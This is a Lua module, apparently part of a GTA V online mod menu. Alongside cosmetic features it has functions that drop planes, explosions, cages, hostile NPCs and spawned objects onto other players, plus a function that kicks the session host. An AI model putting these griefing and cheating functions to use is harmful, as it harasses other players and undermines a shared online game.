        CAM.SHAKE_GAMEPLAY_CAM("HAND_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("HIGH_FALL_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("jolt_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("LARGE_EXPLOSION_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("MEDIUM_EXPLOSION_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("PLANE_PART_SPEED_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("ROAD_VIBRATION_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("SKY_DIVING_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("SMALL_EXPLOSION_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("VIBRATE_SHAKE", 0.0)

        CAM.SET_GAMEPLAY_CAM_SHAKE_AMPLITUDE(0.001)
        CAM.STOP_GAMEPLAY_CAM_SHAKING(true)
    end
end

----RGB随机颜色
function random_colour()
	local colour = {a = 255}
	colour.r = math.random(0,255)
	colour.g = math.random(0,255)
	colour.b = math.random(0,255)
	return colour
end
----渐变RGB颜色
function gradient_colour(timer, frequency)
    local colour = {a = 255}
    local curtime = timer / 1000 
    colour.r = math.floor( math.sin( curtime * frequency + 0 ) * 127 + 128 )
    colour.g = math.floor( math.sin( curtime * frequency + 2 ) * 127 + 128 )
    colour.b = math.floor( math.sin( curtime * frequency + 4 ) * 127 + 128 )
    return colour
end

----获取爱心形状坐标表
function generate_heart_coordinates(center_x, center_y, num_points, scale)
    local coordinates = {}
    local pi = math.pi

    for i = 0, num_points do
        local t = (i / num_points) * 2 * pi
        local x = 16 * math.sin(t)^3 * scale
        local y = (13 * math.cos(t) - 5 * math.cos(2 * t) - 2 * math.cos(3 * t) - math.cos(4 * t)) * scale
        
        -- 平移坐标到指定中心点
        table.insert(coordinates, {x + center_x, y + center_y})
    end

    return coordinates
end
--蜡烛枪
function candle_gun()
    local pos = v3.new()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pos) then
        -- 生成爱心形状的坐标表，设置中心点为(0, 0)，生成50个点，尺寸0.1
        local heart_coordinates = generate_heart_coordinates(pos.x, pos.y, 50, 0.2)
        
        for _, coord in ipairs(heart_coordinates) do
            create_object(util.joaat('v_prop_floatcandle'), coord[1], coord[2], pos.z)
            util.yield(20)
        end
    end
end


----加入组/保镖
function join_group(ped)
    if not PED.IS_PED_IN_GROUP(ped) then
        PED.SET_PED_AS_GROUP_MEMBER(ped, PLAYER.GET_PLAYER_GROUP(PLAYER.PLAYER_ID()))
        PED.SET_PED_NEVER_LEAVES_GROUP(ped, true)
    end
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(ped, MISC.GET_HASH_KEY("rgFM_HateEveryOne")) --"rgFM_HateEveryOne"
    PED.SET_GROUP_SEPARATION_RANGE(PLAYER.GET_PLAYER_GROUP(PLAYER.PLAYER_ID()), 9999.0)
    PED.SET_GROUP_FORMATION_SPACING(PLAYER.GET_PLAYER_GROUP(PLAYER.PLAYER_ID()), 1.0, 0.9, 3.0)
    PED.SET_GROUP_FORMATION(PLAYER.GET_PLAYER_GROUP(PLAYER.PLAYER_ID()), 0)
end

----自定义传送
function Custom_teleport()
    local label = util.register_label("输入坐标(x,y,z),以','分开")
	local input = get_input_from_screen_keyboard(label, 20, "")
    if input == "" then return end
    input = string.gsub(input, "，", ",")
    local tab = string.split(input,",")
    for i = 1, 3 do
        tab[i] = tonumber(tab[i])
        if type(tab[i]) ~= "number" or #tab ~= 3 then
            util.toast("格式错误")
            return 
        end
    end
    teleport(tab[1], tab[2], tab[3], true)
end

----驾驶超级游艇
function super_yacht()
    if not is_entity_on_water(PLAYER.PLAYER_PED_ID()) then
        notification("~y~~bold~不在水上:D", HudColour.blue)
        return
    end
    local CoreSpawnPoint = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 0, 0)
    local CoreSpawnHeading = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())
    local CoreHash = util.joaat("kosatka")
    request_model(CoreHash)
    local Core = entities.create_vehicle(CoreHash, CoreSpawnPoint, CoreSpawnHeading)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), Core, -1)
    ENTITY.SET_ENTITY_VISIBLE(Core, false, false)
    local YachtHash = util.joaat("prop_cj_big_boat")
    request_model(YachtHash)
    local Yacht = entities.create_object(YachtHash, CoreSpawnPoint, CoreSpawnHeading)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Yacht, Core, 0, 0, 0, 0, 0, 0, 0, true, false, false, true, 0, true, 0)
    ENTITY.SET_ENTITY_COLLISION(Yacht, true, false)
    ENTITY.SET_ENTITY_COLLISION(Core, false, false)
end


----神风炮
function create_shooting_target(x, y, z)
    local hash = 510628364
    local target = create_object(hash, x, y, z)--靶子
    ENTITY.SET_ENTITY_VISIBLE(target, true, false)--可见
    ENTITY.SET_ENTITY_COLLISION(target, false)--碰撞
    ENTITY.FREEZE_ENTITY_POSITION(target, true)--冻结
    return target
end
local JetSquadronRealNames = {"Lazer","raiju", "molotok", "pyro", "strikeforce", "seabreeze" , "howard", "besra", "starling", "rogue", "Stunt", "alphaz1", "nimbus", "luxor2", "mogul", "streamer216", "vestra", "cuban800", "dodo", "velum", "mammatus", "duster", "microlight"}
function Kamikaze_Gun()
    local pos = v3.new()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pos) and not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
        local PH_hash = 1267718013
        request_model(PH_hash)
        local PH = OBJECT.CREATE_OBJECT(PH_hash, pos.x, pos.y, pos.z + 0.1, true, false, true)--创建光标
        ENTITY.SET_ENTITY_ROTATION(PH, 0, 0, 90, 2, true)
        ENTITY.SET_ENTITY_VISIBLE(PH, false, false)--不可见
        ENTITY.SET_ENTITY_COLLISION(PH, false)--碰撞
        ENTITY.FREEZE_ENTITY_POSITION(PH, true)--冻结

        local target = create_shooting_target(pos.x, pos.y, pos.z)--目标靶

        local Ppedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_PED_ID())
        local randomPlane = util.joaat(JetSquadronRealNames[math.random(1, #JetSquadronRealNames)])
        request_model(randomPlane)
        local Offset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PH, math.random(-200, 200), math.random(-200, 200), math.random(100, 500))
        local Kamikaze = entities.create_vehicle(randomPlane, Offset, math.random(-180, 180))--创建飞机
        local KamikazeCam = CAM.CREATE_CAMERA(26379945, true)

        util.create_tick_handler(function()
            --防止碰撞
            local distance = Get_distance(ENTITY.GET_ENTITY_COORDS(target, false), ENTITY.GET_ENTITY_COORDS(Kamikaze, false), true)
            if distance > 10 then ENTITY.SET_ENTITY_COLLISION(Kamikaze, false, true) else ENTITY.SET_ENTITY_COLLISION(Kamikaze, true, true) end

            if ENTITY.DOES_ENTITY_EXIST(Kamikaze) then--禁止执行中重复生成模型
                PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
            else
                PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
            end
            set_entity_face_entity(Kamikaze, PH, true)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(Kamikaze, 1, 0, 1.5, 0.0, true, true, true, true)
            CAM.RENDER_SCRIPT_CAMS(true, false, 3000, 1, 0, 0)
            CAM.SHAKE_CAM(KamikazeCam, "DRUNK_SHAKE", 1)
            GRAPHICS.ANIMPOSTFX_PLAY("MP_corona_switch_supermod", 0, true)
            GRAPHICS.ANIMPOSTFX_PLAY("MP_OrbitalCannon", 0, true)

            if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(Kamikaze) then--判断实体是否与任何物体碰撞
                local KamikazeOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(Kamikaze,  math.random(-5, 5),  math.random(-5, 5),  math.random(-5, 5))
                FIRE.ADD_EXPLOSION(KamikazeOffset.x, KamikazeOffset.y, KamikazeOffset.z, 59, 1, true, false, 1.0, false)
                AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "DLC_XM_Explosions_Orbital_Cannon", Kamikaze, 0, true, 0)

                util.yield(1500)
                --还原相机
                CAM.RENDER_SCRIPT_CAMS(false, false, 3000, 1, 0, 0);
                CAM.DESTROY_CAM(KamikazeCam, true)
                GRAPHICS.ANIMPOSTFX_STOP("MP_OrbitalCannon", 0, true)
                GRAPHICS.ANIMPOSTFX_STOP("MP_OrbitalCannon", 0, true)
                GRAPHICS.ANIMPOSTFX_STOP("MP_corona_switch_supermod", 0, true)
                GRAPHICS.ANIMPOSTFX_STOP("MP_corona_switch_supermod", 0, true)
                delete_entity(Kamikaze)
                delete_entity(PH)
                delete_entity(target)
                return false
            end
        end)
        CAM.HARD_ATTACH_CAM_TO_ENTITY(KamikazeCam, Kamikaze, -10, 0, 0, 0, -10, 6, true)
        local cause = VEHICLE.GET_VEHICLE_CAUSE_OF_DESTRUCTION(Kamikaze)
        VEHICLE.SET_ALLOW_VEHICLE_EXPLODES_ON_CONTACT(Kamikaze, true)
        VEHICLE.SET_VEHICLE_ENGINE_ON(Kamikaze, true, true, 0)
        KamikazePilot = PED.CREATE_RANDOM_PED_AS_DRIVER(Kamikaze, 1)
        VEHICLE.CONTROL_LANDING_GEAR(Kamikaze, 3)
    end
end

--发送神风炮
function Send_Kamikaze_Gun(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local randomPlane = util.joaat(JetSquadronRealNames[math.random(1, #JetSquadronRealNames)])
    request_model(randomPlane)
    local Offset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), math.random(-200, 200), math.random(-200, 200), math.random(100, 500))
    local Kamikaze = entities.create_vehicle(randomPlane, Offset, math.random(-180, 180))--创建飞机
    local KamikazeCam = CAM.CREATE_CAMERA(26379945, true)

    util.create_tick_handler(function()
        --防止碰撞
        local distance = Get_distance(ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false), ENTITY.GET_ENTITY_COORDS(Kamikaze, false), true)
        if distance > 10 then ENTITY.SET_ENTITY_COLLISION(Kamikaze, false, true) else ENTITY.SET_ENTITY_COLLISION(Kamikaze, true, true) end

        set_entity_face_entity(Kamikaze, PLAYER.GET_PLAYER_PED(pid), true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(Kamikaze, 1, 0, 1.5, 0.0, true, true, true, true)
        CAM.RENDER_SCRIPT_CAMS(true, false, 3000, 1, 0, 0)
        CAM.SHAKE_CAM(KamikazeCam, "DRUNK_SHAKE", 1)
        GRAPHICS.ANIMPOSTFX_PLAY("MP_corona_switch_supermod", 0, true)
        GRAPHICS.ANIMPOSTFX_PLAY("MP_OrbitalCannon", 0, true)

        if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(Kamikaze) then--判断实体是否与任何物体碰撞
            local KamikazeOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(Kamikaze,  math.random(-5, 5),  math.random(-5, 5),  math.random(-5, 5))
            FIRE.ADD_EXPLOSION(KamikazeOffset.x, KamikazeOffset.y, KamikazeOffset.z, 59, 1, true, false, 1.0, false)
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "DLC_XM_Explosions_Orbital_Cannon", Kamikaze, 0, true, 0)

            util.yield(1500)
            CAM.RENDER_SCRIPT_CAMS(false, false, 3000, 1, 0, 0);
            CAM.DESTROY_CAM(KamikazeCam, true)
            GRAPHICS.ANIMPOSTFX_STOP("MP_OrbitalCannon", 0, true)
            GRAPHICS.ANIMPOSTFX_STOP("MP_OrbitalCannon", 0, true)
            GRAPHICS.ANIMPOSTFX_STOP("MP_corona_switch_supermod", 0, true)
            GRAPHICS.ANIMPOSTFX_STOP("MP_corona_switch_supermod", 0, true)
            delete_entity(Kamikaze)
            return false
        end
    end)
    CAM.HARD_ATTACH_CAM_TO_ENTITY(KamikazeCam, Kamikaze, -10, 0, 0, 0, -10, 6, true)
    local cause = VEHICLE.GET_VEHICLE_CAUSE_OF_DESTRUCTION(Kamikaze)
    VEHICLE.SET_ALLOW_VEHICLE_EXPLODES_ON_CONTACT(Kamikaze, true)
    VEHICLE.SET_VEHICLE_ENGINE_ON(Kamikaze, true, true, 0)
    KamikazePilot = PED.CREATE_RANDOM_PED_AS_DRIVER(Kamikaze, 1)
    VEHICLE.CONTROL_LANDING_GEAR(Kamikaze, 3)
end


----玩家栏
function player_bar()
    local posx = 0.01
    local posy = 0.005

    for pid = 0, 32 do
        if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
            local name = PLAYER.GET_PLAYER_NAME(pid)
            local infotags = " ["
            local infocolor = "~w~";local infocolor2 = "~o~"
            local network = memory.alloc(13*4)
            NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid,network,13)
        --标签
            if players.get_host() == pid then
                infotags = infotags .. "H"
                infocolor = "~y~"
            end
            if players.get_script_host() == pid then
                infotags = infotags .. "S"
                infocolor = "~b~"
            end
            if players.is_marked_as_modder(pid) then
                infotags = infotags .. "M"
                infocolor = "~r~"
            end
            if players.is_godmode(pid) then 
                infotags = infotags .. "G"
            end
            if players.is_in_interior(pid) then
                infotags = infotags .. "I"
                infocolor = "~g~"
            end
            if NETWORK.NETWORK_IS_FRIEND(network) then
                infotags = infotags .. "F"
                infocolor = "~q~"
            end

            if PLAYER.PLAYER_ID() == pid then
                infocolor = "~b~"
            end

            if infotags == " [" then
                infotags = ""
            else
                infotags = infotags.."]"
            end

            draw_string(infocolor..name..infocolor2..infotags, posx, posy, 0.4, 4)

            posx = posx + (#name + #infotags)/400 + 0.04
            
            if posx > 0.93 then
                posy = posy + 0.02
                posx = 0.01
            end
        end
    end
end


----删除枪
function delete_gun()
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        local entity = get_entity_player_is_aiming_at(PLAYER.PLAYER_ID())
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        if not PED.IS_PED_A_PLAYER(entity) then
            delete_entity(entity)
        end
    end
end


----喇叭爆炸
function horn_bomb()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), false)
    if AUDIO.IS_HORN_ACTIVE(vehicle) then
        local coords = ENTITY.GET_ENTITY_COORDS(vehicle)
        local shootCoords = v3.new(coords)
        for i = 1, 3 do
            local rot = ENTITY.GET_ENTITY_ROTATION(vehicle, 2):toDir()
            local vel = ENTITY.GET_ENTITY_VELOCITY(vehicle)
            v3.mul(rot, 25 + math.abs(vel.x))
            v3.add(shootCoords, rot)
            FIRE.ADD_OWNED_EXPLOSION(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1), shootCoords.x + math.random(-2, 2), shootCoords.y + math.random(-2, 2), shootCoords.z, 10, 100,true, false, 0.1)
            util.yield()
        end
    end
end


----推动玩家
function Driving_Player(pid)
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        local player = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
        ENTITY.APPLY_FORCE_TO_ENTITY(PLAYER.GET_PLAYER_PED(pid), 3, 50, 50, 0, 0.0, 0.0, 0.0, 0, false, false, true, false, false)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        delete_entity(dumb_object_front)
        delete_entity(dumb_object_back)
        util.yield()
    end
end



----仓鼠球
function Hamster_Ball(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local hash = 1768956181
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -1)
    local obj = {}
    for i = 1, 18 do
        obj[i] = create_object(hash, pos.x, pos.y, pos.z)
        ENTITY.SET_ENTITY_ROTATION(obj[i], 0, 0, i * 10 , 1, true)
    end
end

----粉碎机
function shredder(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local hash = util.joaat('sr_mp_spec_races_take_flight_sign')
    for i=-3, 5 do 
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, i, 2)
        local crusher = create_object(hash, pos.x, pos.y, pos.z)
        ENTITY.SET_ENTITY_ROTATION(crusher, 0, 180, ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED(pid)) + 90, 2)
    end
end

----升天电梯
function biker_lift(on,pid)
    biker_toggled = on
    if biker_toggled then
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        local hash = -1342281820
        request_model(hash)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        pos.z = pos.z - 10
        send_biker = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos.x, pos.y, pos.z, true, false, true)
        while biker_toggled do
            local pos2 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(send_biker, pos2.x, pos2.y, pos.z, false, false, false, false)
            pos.z = pos.z + 0.1
            util.yield(10)
            local pos3 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            local hight = pos3.z
            if pos.z > hight then
                ENTITY.APPLY_FORCE_TO_ENTITY(PLAYER.GET_PLAYER_PED(pid), 3, 50, 50, 0, 0.0, 0.0, 0.0, 0, false, false, true, false, false)
                ENTITY.APPLY_FORCE_TO_ENTITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false), 3, 50, 50, 0, 0.0, 0.0, 0.0, 0, false, false, true, false, false)
                pos.z = hight - 10
            end
        end
    else
        delete_entity(send_biker)
    end
end


----极限跳跃
function extreme_jump(index)
    if index == 1 then
        SpawnHeight = 250
    elseif index == 2 then
        SpawnHeight = 500
    elseif index == 3 then
        SpawnHeight = 1000
    end

    local pedm = PLAYER.PLAYER_PED_ID()
    local PlaneHash = 368211810
    local CarHash = 941494461--1455990255
    request_model(PlaneHash)
    request_model(CarHash)
    local heading = ENTITY.GET_ENTITY_HEADING(pedm)
    local PlaneSpawnLoc = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pedm, 0, 0, SpawnHeight)
    local CarSpawnLoc = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pedm, 0, 0, SpawnHeight + 4) --104
    
    local Plane = entities.create_vehicle(PlaneHash, PlaneSpawnLoc, heading)
    ENTITY.SET_ENTITY_INVINCIBLE(Plane, true)
    if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then
        Car = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_HEADING(Car, heading + 180)
        ENTITY.SET_ENTITY_VELOCITY(Car, 0, 100, 0)
    else 
        Car = entities.create_vehicle(CarHash, CarSpawnLoc, 0)
        ENTITY.SET_ENTITY_HEADING(Car, heading + 180)
        PED.SET_PED_INTO_VEHICLE(pedm, Car, -1)
    end
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(Plane, 1, 0, 100, 0, true, true, true, true)
    ENTITY.SET_ENTITY_COORDS(Car, CarSpawnLoc.x, CarSpawnLoc.y, CarSpawnLoc.z, false, false, false, false)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(Car, 1, 0, -100, 0, true, true, true, true)

    local Timer = 350
    util.create_tick_handler(function()
        Timer = Timer - 1
        util.draw_centred_text("开仓倒计时 : " .. Timer)
        if Timer < 0 then
            VEHICLE.SET_VEHICLE_DOOR_OPEN(Plane, 2, false, false)
            return false
        end
    end)
end


----飞机撞向花园银行
function planetobank()
    local pos = {x = -914.1707, y = -1164.9396, z=250}
    local plane = create_vehicle(util.joaat('jet'), pos.x, pos.y, pos.z, -68)
    VEHICLE.SET_VEHICLE_ENGINE_ON(plane, true, true, false)
    VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
    VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(plane, 0.0)
    for i=1, 5 do 
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
        util.yield(1000)
    end
end

----生成怪兽军队
function Create_Monster_Army(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_Yule_army = {}
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local Yule = util.joaat("U_M_M_YuleMonster")
    request_model(Yule)
    for i = 1, 48 do
        player_Yule_army[i] = entities.create_ped(28, Yule, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_Yule_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_Yule_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_Yule_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_Yule_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
        WEAPON.GIVE_WEAPON_TO_PED(player_Yule_army[i], util.joaat('WEAPON_CANDYCANE'),  9999, true, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(player_Yule_army[i], 20, true)
        PED.SET_PED_SHOOT_RATE(player_Yule_army[i], 1000)
        util.yield()
    end 
end

----炸弹车
function bomb_car()
    local hash = util.joaat("speedo2")
    request_model(hash)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 0, 0)
    local heading = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())
    local spawnedCar = entities.create_vehicle(hash, pos, heading)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawnedCar, -1) 
    util.toast('~o~按下鼠标右键引爆载具')
    util.create_tick_handler(function()
        if not ENTITY.DOES_ENTITY_EXIST(spawnedCar) then return false end
        VEHICLE.START_VEHICLE_HORN(spawnedCar, 300, 1330140418, false)
        util.yield(500)
    end)
    while spawnedCar do
        ENTITY.SET_ENTITY_INVINCIBLE(spawnedCar, false)
        if PAD.IS_CONTROL_PRESSED(0, 68) then
            local Bomboffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(spawnedCar, 0, 0, 0)
            FIRE.ADD_EXPLOSION(Bomboffset.x, Bomboffset.y, Bomboffset.z, 59, 1, true, false, 1.0, false)
            util.yield(1000)
            delete_entity(spawnedCar)
            break
        end
        util.yield()
    end
end




----猫猫炸弹
function cat_bomb(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local target_ped = PLAYER.GET_PLAYER_PED(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    hash = util.joaat("a_c_cat_01")
    request_model(hash)
    for i=1, 30 do
        local cat = entities.create_ped(28, hash, coords, math.random(0, 270))
        local rand_x = math.random(-10, 10)*5
        local rand_y = math.random(-10, 10)*5
        local rand_z = math.random(-10, 10)*5
        ENTITY.SET_ENTITY_INVINCIBLE(cat, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(cat, 1, rand_x, rand_y, rand_z, true, false, true, true)
        AUDIO.PLAY_PAIN(cat, 7, 0)
    end
end

----复活PED
function resurrect_ped(ped)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    PED.RESURRECT_PED(ped)
    PED.SET_PED_KEEP_TASK(ped, true)
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(ped, MISC.GET_HASH_KEY("rgFM_HateEveryOne"))
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 0, false)
    PED.SET_PED_FLEE_ATTRIBUTES(ped, 512, true)
    PED.SET_PED_COMBAT_RANGE(ped, 2)
    ENTITY.SET_ENTITY_HEALTH(ped, MISC.GET_RANDOM_INT_IN_RANGE(125, 150), 0)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
end

----自动就绪主机
function AutoReadyHost()
    if NETWORK.NETWORK_IS_SESSION_STARTED() then
        local hostxvlie = players.get_host_queue_position(PLAYER.PLAYER_ID())
        local host = NETWORK.NETWORK_GET_HOST_PLAYER_INDEX()
        if hostxvlie == 1 and (host ~= PLAYER.PLAYER_ID()) then
            local hostname = PLAYER.GET_PLAYER_NAME(host)
            menu.trigger_commands("kick " .. hostname)
        end
    end
end

----过渡状态
function getTransitionState()
	return memory.read_int(memory.script_global(1575011))  
end
--返回当前过渡名字
function getTransitionStateName() -- credit to sapphire for this function
    local state = getTransitionState()
    return TransitionState[state]
end
function show_transition_active()
    if util.is_session_transition_active() then
        HUD.BEGIN_TEXT_COMMAND_BUSYSPINNER_ON("STRING")
        HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(getTransitionStateName())
        HUD.END_TEXT_COMMAND_BUSYSPINNER_ON(5)
    else
        HUD.BUSYSPINNER_OFF()
    end
    util.yield(1000)
end

----绘制玩家模型
local cur_rot = 0
local cur_focused_player = nil
local cur_clone = 0
function create_player_clone(pid)
    local new_ped = PED.CLONE_PED(PLAYER.GET_PLAYER_PED(pid), false, false, true)
    --判断玩家是否死亡，复活模型可防止模型躺在地上
    if PED.IS_PED_DEAD_OR_DYING(new_ped, true) then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(new_ped)
        PED.RESURRECT_PED(new_ped)
        ENTITY.SET_ENTITY_HEALTH(new_ped, MISC.GET_RANDOM_INT_IN_RANGE(125, 150), 0)
    end
    ENTITY.FREEZE_ENTITY_POSITION(new_ped, true)
    ENTITY.SET_ENTITY_INVINCIBLE(new_ped, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(new_ped, true)
    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(new_ped, true)
    ENTITY.SET_ENTITY_COORDS(new_ped, 0, 0, -50, true, true, true, false)
    ENTITY.SET_ENTITY_ALPHA(new_ped, 200, false)
    ENTITY.SET_ENTITY_COLLISION(new_ped, false, true)
    return new_ped
end
function Draw_player_model()
    local focused = players.get_focused()
    if (focused[1] ~= nil and focused[2] == nil) and menu.is_open() then
        local pid = focused[1]
        if pid ~= cur_focused_player then
            if cur_clone ~= 0 then
                delete_entity(cur_clone)
            end
            cur_focused_player = pid
            cur_clone = create_player_clone(pid)
        end
        local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        local offset = get_offset_from_camera(8)--从相机获取偏移量
        --ENTITY.SET_ENTITY_COORDS(cur_clone, offset.x, offset.y, offset.z-1, true, true, true, false)
        ENTITY.SET_ENTITY_COORDS(cur_clone, offset.x, offset.y, mypos.z - 0.5, true, true, true, false)
        ENTITY.SET_ENTITY_ROTATION(cur_clone, 0, 0, cur_rot, 0, true)
        --util.draw_box(v3.new(offset.x, offset.y, offset.z + 0.1), v3.new(0, 0, cur_rot), v3.new(1, 1, 2), 255, 255, 255, 50)
        util.draw_box(v3.new(offset.x, offset.y, mypos.z + 0.5), v3.new(0, 0, cur_rot), v3.new(1, 1, 2), 255, 255, 255, 50)
        if cur_rot >= 360 then
            cur_rot = 0 
        else 
            cur_rot = cur_rot + 1
        end
    else
        if cur_focused_player ~= nil then
            delete_entity(cur_clone)
            cur_clone = 0
            cur_focused_player = nil
        end
    end
end




----娱乐粒子效果
local selptfx = {a= "scr_rcbarry2",b= "scr_clown_appears",c ="5"}
function ptfx_fun()
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    request_ptfx_asset(selptfx.a)
    GRAPHICS.USE_PARTICLE_FX_ASSET(selptfx.a)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(selptfx.b, tar1.x, tar1.y, tar1.z, 0, 0, 0, selptfx.c, true, true, false)
    util.yield(200)
end
function sel_ptfx_fun(value)
    local ptfx = funptfx.value[value]
    selptfx.c = ptfx[3]--size
